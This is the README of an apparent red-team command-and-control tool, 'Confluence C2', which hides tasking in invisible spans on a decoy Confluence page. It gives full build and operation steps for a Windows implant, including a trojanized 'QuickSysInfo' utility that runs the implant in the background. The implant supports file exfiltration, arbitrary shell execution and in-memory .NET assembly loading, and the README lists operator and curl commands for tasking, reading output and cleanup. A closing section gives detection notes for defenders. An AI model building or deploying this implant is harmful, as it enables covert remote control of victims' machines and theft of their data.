# Confluence C2

**Author:** Dhanush Arvind

A command-and-control channel that uses Atlassian Confluence wiki pages as the communication medium. Commands are embedded as hidden spans in a page body; results come back as child comments on the same page. All traffic is legitimate HTTPS to the Confluence REST API.
---

## Architecture

```
Operator (c2_operator.py)  Confluence REST API              Implant
  |                              |                              |
  |-- Update page body -------->|                              |
  |   (hidden span C2:TASK)     |                              |
  |                              |<--- GET page body (poll) ---|
  |                              |     parse hidden spans      |
  |                              |                              | execute
  |                              |<--- POST child comment -----|
  |                              |     (span C2:OUT:...)       |
  |-- GET child comments -------|                              |
```

### Communication Protocol

- **Commands**: Embedded as invisible spans in the page body:
  `<span style="display:none">C2:TASK:task_id:agent_id:base64_encoded_command</span>`
  The `agent_id` field targets a specific agent (`*` for broadcast to all)
- **Output**: Posted as child comments on the same page:
  `<span style="display:none">C2:OUT:task_id:agent_id:base64_encoded_output</span>`
- **Registration**: Child comment with:
  `<span style="display:none">C2:REG:agent_id:base64_encoded_sysinfo</span>`
- **Why not HTML comments?** Confluence Cloud strips `<!-- -->` from storage format. Hidden spans survive the sanitizer and are invisible in rendered view.
- **Auth**: HTTP Basic (`email:api_token`), standard for Confluence Cloud/Server

---

## Files

| File                 | Description                                               |
|----------------------|-----------------------------------------------------------|
| `implant.c`          | Standalone Confluence C2 implant (C, WinHTTP)             |
| `host_app.c`         | Clean "QuickSysInfo" utility — no implant code            |
| `implant_bundled.c`  | Trojanized: implant thread + sysinfo foreground           |
| `configure.py`       | Replaces config placeholders, writes to `build/`          |
| `c2_operator.py`     | Operator CLI (requests): setup, task, read, interact      |
| `build/`             | Output directory for configured source and binaries       |

---

## Complete Setup Guide (Step by Step)

### Prerequisites

- **Python 3.8+** with `requests`:
  ```
  pip install requests
  ```
- **Confluence Cloud** account with an API token (generate at https://id.atlassian.com/manage-profile/security/api-tokens), or Confluence Server credentials
- **MinGW GCC** — either:
  - WSL with `x86_64-w64-mingw32-gcc` (`sudo apt install gcc-mingw-w64-x86-64`), or
  - Native MinGW-w64 installed on Windows and added to PATH

---

### Step 1: Create the C2 Page

Use the operator script to create a decoy wiki page in your Confluence space:

```
python c2_operator.py ^
    --url https://yourcompany.atlassian.net ^
    --email you@company.com ^
    --api-token YOUR_API_TOKEN ^
    setup --space-key MYSPACE
```

Output:
```
[+] Created page: Meeting Notes - Q4 Planning
[+] Page ID: 12345678
[+] URL: https://yourcompany.atlassian.net/wiki/spaces/MYSPACE/pages/12345678
    Use --page-id 12345678 for future commands.
```

Save the **Page ID** — you need it for everything below.

To use a custom title:
```
python c2_operator.py --url ... --email ... --api-token ... setup --space-key MYSPACE --title "Sprint Retro Notes"
```

---

### Step 2: Configure the Implant

Run `configure.py` to bake your Confluence credentials and page ID into the implant source:

```
python configure.py ^
    --url https://yourcompany.atlassian.net ^
    --email you@company.com ^
    --api-token YOUR_API_TOKEN ^
    --page-id 12345678 ^
    --sleep 10000
```

Arguments:
| Argument            | Required | Description                                      |
|---------------------|----------|--------------------------------------------------|
| `--url`             | Yes      | Confluence base URL                              |
| `--email`           | Yes      | Confluence account email                         |
| `--api-token`       | Yes      | Confluence API token                             |
| `--page-id`         | Yes      | Page ID from Step 1                              |
| `--sleep`           | No       | Beacon interval in milliseconds (default: 10000) |
| `--output`          | No       | Output directory (default: `build`)              |
| `--no-wiki-prefix`  | No       | Skip `/wiki` prefix (for Confluence Server)      |
| `--compile`         | No       | Auto-compile if gcc is in PATH                   |

Output:
```
[*] Host: yourcompany.atlassian.net:443
[*] Page ID: 12345678
[*] Wiki prefix: yes
[*] Sleep: 10000 ms
[+] Configured implant.c -> build/implant.c
[+] Configured implant_bundled.c -> build/implant_bundled.c
[+] Copied host_app.c -> build/host_app.c
[*] Configuration complete. Output: build
```

The `build/` directory now contains C source files with your credentials embedded.

---

### Step 3: Compile with MinGW

#### Option A: WSL MinGW Cross-Compiler (Recommended on Windows)

From **PowerShell** (not Git Bash — Git Bash mangles `/mnt/c/` paths):

```powershell
# Standalone implant
wsl x86_64-w64-mingw32-gcc -O2 -o /mnt/c/path/to/confluence_c2/build/implant.exe /mnt/c/path/to/confluence_c2/build/implant.c -lwinhttp -lws2_32

# Bundled (trojanized QuickSysInfo with implant thread)
wsl x86_64-w64-mingw32-gcc -O2 -DBUNDLED_BUILD -o /mnt/c/path/to/confluence_c2/build/QuickSysInfo.exe /mnt/c/path/to/confluence_c2/build/implant_bundled.c -lwinhttp -lws2_32 -liphlpapi

# Clean host app only (no implant)
wsl x86_64-w64-mingw32-gcc -O2 -o /mnt/c/path/to/confluence_c2/build/QuickSysInfo_clean.exe /mnt/c/path/to/confluence_c2/build/host_app.c -lws2_32 -liphlpapi
```

Replace `/mnt/c/path/to/confluence_c2` with the actual WSL path to your project.

#### Option B: Native MinGW on Windows

If you have `x86_64-w64-mingw32-gcc` or `gcc` (MinGW-w64) in your Windows PATH:

```
gcc -O2 -o build\implant.exe build\implant.c -lwinhttp -lws2_32
gcc -O2 -DBUNDLED_BUILD -o build\QuickSysInfo.exe build\implant_bundled.c -lwinhttp -lws2_32 -liphlpapi
gcc -O2 -o build\QuickSysInfo_clean.exe build\host_app.c -lws2_32 -liphlpapi
```

#### Option C: Auto-Compile via configure.py

If gcc is in PATH, add `--compile` to Step 2:
```
python configure.py --url ... --email ... --api-token ... --page-id 12345678 --sleep 10000 --compile
```

#### Build Outputs

| Binary                    | Description                                       |
|---------------------------|---------------------------------------------------|
| `build/implant.exe`       | Standalone implant — beacon only                  |
| `build/QuickSysInfo.exe`  | Bundled — looks like a sysinfo tool, implant runs in background thread |
| `build/QuickSysInfo_clean.exe` | Clean sysinfo utility — no implant code      |

---

### Step 4: Execute the Implant

Run the compiled implant on the target machine:

```
build\implant.exe
```

Or the bundled version (appears as a system info viewer):
```
build\QuickSysInfo.exe
```

The implant will:
1. Generate an agent ID from hostname+username
2. Register itself by posting a `C2:REG` comment on the page
3. Begin polling the page body for `C2:TASK` markers every `SLEEP_MS` milliseconds
4. Simultaneously poll child comments for `[cmd]` comment-based commands

---

### Step 5: Verify the Agent Registered

```
python c2_operator.py ^
    --url https://yourcompany.atlassian.net ^
    --email you@company.com ^
    --api-token YOUR_API_TOKEN ^
    --page-id 12345678 ^
    list
```

Output:
```
ID           Hostname             Username           PID      Registered
--------------------------------------------------------------------------------
90bd7c8a     DESKTOP-PC           jsmith             12345    2026-10-19T10:30:00.000Z

Available commands:
  task <agent_id> <cmd>       Send command via page body (hidden span)
  ctask <cmd>                 Send command as comment (browser mode, broadcast)
  ctask --agent <id> <cmd>    Send command as comment targeting one agent
  read [agent_id]             Read output comments
  interact <agent_id>         Interactive shell
  inlineexecute <agent_id> <assembly_path> [args]
                              Execute .NET assembly in-memory on agent
  cleanup                     Remove all C2 markers and comments
  help                        Show this help
```

---

### Step 6: Send Commands

#### Via Operator Script (page body — hidden spans)

```
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 task 90bd7c8a "whoami"
```

#### Via Operator Script (comment — also visible in browser)

```
# Broadcast to all agents
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 ctask "whoami"

# Target specific agent
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 ctask --agent 90bd7c8a "whoami"
```

#### Via Browser (no tools needed)

Navigate to the C2 page in your browser and post a comment:
```
[cmd] whoami
```

Target a specific agent:
```
[cmd:90bd7c8a] whoami
```

Wait ~10 seconds. The implant replies with a visible comment showing the output.

#### Interactive Shell

```
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 interact 90bd7c8a
```

#### Read Output

```
# All output
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 read

# Filter by agent
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 read 90bd7c8a
```

#### Execute .NET Assembly In-Memory

```
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 inlineexecute 90bd7c8a C:\path\to\Seatbelt.exe "-group=all"
```

---

### Step 7: Kill the Implant

Send the `exit` command to terminate the implant process on the target:

```
# Via operator script
python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 task 90bd7c8a "exit"

# Via browser comment
[cmd] exit

# Target specific agent
[cmd:90bd7c8a] exit
```

The implant posts "Agent exiting" as its final output and terminates via `ExitProcess(0)`.

---

### Step 8: Clean Up

Remove all C2 markers from the page body and delete C2 comments:

```
python c2_operator.py ^
    --url https://yourcompany.atlassian.net ^
    --email you@company.com ^
    --api-token YOUR_API_TOKEN ^
    --page-id 12345678 ^
    cleanup
```

---

## Implant Commands

| Command            | Description                              |
|--------------------|------------------------------------------|
| `whoami`           | Print hostname\username                  |
| `pwd`              | Print current directory                  |
| `cd <dir>`         | Change directory                         |
| `ls [dir]`         | List directory contents                  |
| `cat <file>`       | Print file contents                      |
| `ps`               | List running processes                   |
| `ipconfig`         | Show network configuration               |
| `netstat`          | Show active connections                  |
| `info`             | Print agent metadata                     |
| `download <file>`  | Base64-encode and exfiltrate a file      |
| `shell <cmd>`      | Execute arbitrary command via cmd.exe    |
| `execute-assembly <b64> [args]` | Load and run .NET assembly in memory |
| `help`             | Show available commands                  |
| `exit`             | Terminate the implant process            |
| *(anything else)*  | Executed as a shell command              |

---

## Multi-Agent Support and Targeting

Multiple agents can share the same page. Each agent registers with a unique ID derived from hostname+username.

### Page-body commands (operator script)

Commands sent via `task` are embedded with the target agent ID:
```
C2:TASK:task_id:agent_id:base64_command
```
Only the targeted agent executes the command. Use `*` as agent_id to broadcast.

### Comment commands (browser mode)

- `[cmd] whoami` — broadcast to ALL agents on the page
- `[cmd:abc12345] whoami` — target a specific agent by ID

Output from each agent is posted as a separate comment with the agent ID in brackets.

---

## Execute-Assembly (In-Memory .NET Execution)

Load and run .NET assemblies in-memory on the target without dropping the assembly to disk.

### Via operator script

```
python c2_operator.py ... --page-id 12345678 inlineexecute <agent_id> <path_to_assembly.exe> [args]
```

The operator reads the assembly file, base64-encodes it, and sends it as an `execute-assembly` command via the page body.

### How it works

1. Implant receives `execute-assembly <base64_assembly> [args]`
2. Writes a temporary PowerShell loader script that calls `[Reflection.Assembly]::Load($bytes)`
3. Invokes the assembly's entry point with optional arguments
4. Captures stdout and returns output
5. Deletes the temp .ps1 file

### Limitations

- Requires PowerShell on the target (present by default on Windows)
- The .ps1 loader script briefly touches disk (deleted immediately after execution)
- Large assemblies (>200KB base64) may exceed Confluence page body limits

---

## Browser UI Limitations (Multiple Agents / Execute-Assembly)

When operating from the browser comment interface:

- **No execute-assembly**: Assembly base64 payloads can be 100KB+, far exceeding the ~32KB Confluence comment size limit. Use the operator script for execute-assembly.
- **No binary file upload**: Browser comments are text only.
- **Multiple agents**: All agents see `[cmd]` comments. Use `[cmd:AGENTID]` to target one specific agent.
- **No structured output routing**: Browser comments show all output interleaved. Look for the agent ID prefix `[AGENTID] >`.

For complex operations (execute-assembly, multi-agent targeting, automated polling), use `c2_operator.py`.

---

## Operating Without the Operator Script (curl / Confluence REST API)

You can operate entirely with `curl` against the Confluence REST API.

### Variables

```bash
BASE="https://mycompany.atlassian.net/wiki/rest/api"   # Cloud (has /wiki)
# BASE="https://confluence.internal/rest/api"            # Server (no /wiki)
AUTH="user@company.com:ATATT3xFfGF0..."                 # email:api_token
PAGE_ID="12345678"
```

### Send a Command

```bash
PAGE=$(curl -s -u "$AUTH" "$BASE/content/$PAGE_ID?expand=body.storage,version")
VERSION=$(echo "$PAGE" | python -c "import sys,json; print(json.load(sys.stdin)['version']['number'])")
TITLE=$(echo "$PAGE" | python -c "import sys,json; print(json.load(sys.stdin)['title'])")
BODY=$(echo "$PAGE" | python -c "import sys,json; print(json.load(sys.stdin)['body']['storage']['value'])")
TASK_ID="t001"
CMD_B64=$(echo -n "whoami" | base64)
NEW_VERSION=$((VERSION + 1))
curl -s -u "$AUTH" -X PUT "$BASE/content/$PAGE_ID" \
    -H "Content-Type: application/json" \
    -d "{
        \"version\": {\"number\": $NEW_VERSION},
        \"title\": \"$TITLE\",
        \"type\": \"page\",
        \"body\": {\"storage\": {
            \"value\": \"$BODY<p><span style=\\\"display:none\\\">C2:TASK:$TASK_ID:$CMD_B64</span></p>\",
            \"representation\": \"storage\"
        }}
    }"
```

### Read Output

```bash
curl -s -u "$AUTH" "$BASE/content/$PAGE_ID/child/comment?expand=body.storage" | \
    python -c "
import sys, json, base64
data = json.load(sys.stdin)
for c in data.get('results', []):
    body = c['body']['storage']['value']
    if '>C2:OUT:' in body:
        start = body.index('>C2:OUT:') + 8
        end = body.index('</span>', start)
        parts = body[start:end].split(':', 2)
        if len(parts) >= 3:
            print(f'[task={parts[0]} agent={parts[1]}]')
            print(base64.b64decode(parts[2]).decode())
"
```

### Clean Up

```bash
curl -s -u "$AUTH" "$BASE/content/$PAGE_ID/child/comment" | \
    python -c "
import sys, json
data = json.load(sys.stdin)
for c in data.get('results', []):
    body = c.get('body',{}).get('storage',{}).get('value','')
    if '>C2:REG:' in body or '>C2:OUT:' in body or '[cmd' in body:
        print(c['id'])
" | while read CID; do
    curl -s -u "$AUTH" -X DELETE "$BASE/content/$CID"
    echo "Deleted comment $CID"
done
```

---

## Detection Notes

For blue-team defenders testing detection capabilities:

- **Network**: HTTPS traffic to `*.atlassian.net` or your Confluence server. Periodic GET to the same page ID + frequent comment POST calls.
- **Page forensics**: Hidden spans (`<span style="display:none">C2:TASK:...</span>`) are invisible in rendered view but visible in storage format via REST API.
- **Comment volume**: Unusual volume of child comments on a single page with hidden span markers.
- **Auth**: Basic auth with API token. Monitor Confluence audit logs for API access patterns from unusual IPs.
- **Host**: Implant links `winhttp.dll`, spawns `cmd.exe` for shell commands. Execute-assembly creates a temporary `.ps1` file and invokes `powershell.exe`.

---

## Limitations

- Sleep interval is compile-time (no dynamic jitter)
- Page body grows with each command (markers accumulate until cleanup)
- Output size limited by Confluence comment size limits (~32KB)
- File download limited to ~30KB (base64 in comment body)
- Single page ID per implant build
